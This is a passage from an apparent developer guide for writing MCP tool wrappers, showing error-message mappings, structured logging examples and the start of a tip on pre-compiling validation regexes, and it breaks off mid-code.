    "validation_error": "Check argument format. Use --help for syntax.",
    "timeout": "Increase timeout_sec or reduce operation scope.",
    "not_found": f"Install {self.command_name} or add to PATH.",
    "permission_denied": "Run with appropriate permissions or adjust policy.",
    "network_error": "Check network connectivity and firewall rules.",
}
3. Logging
Structured Logging:

Python

# ✅ Good: Structured, parseable
log.info("tool.execution_started tool=%s target=%s args=%s correlation_id=%s",
         self.tool_name, inp.target, inp.extra_args, inp.correlation_id)

# ❌ Bad: Unstructured, hard to parse
log.info(f"Starting {self.tool_name} on {inp.target} with {inp.extra_args}")
Log Levels:

Python

log.debug("validation.check_passed check=port_spec value=%s", port_spec)
log.info("tool.execution_completed returncode=%d duration=%.2f", rc, duration)
log.warning("tool.result_truncated original_size=%d truncated_size=%d", orig, trunc)
log.error("tool.execution_failed error=%s", str(e), exc_info=True)
4. Performance
Optimize Validation:

Python

# Pre-compile regex patterns
class MyTool(MCPBaseTool):
    _PATTERN = 
Som
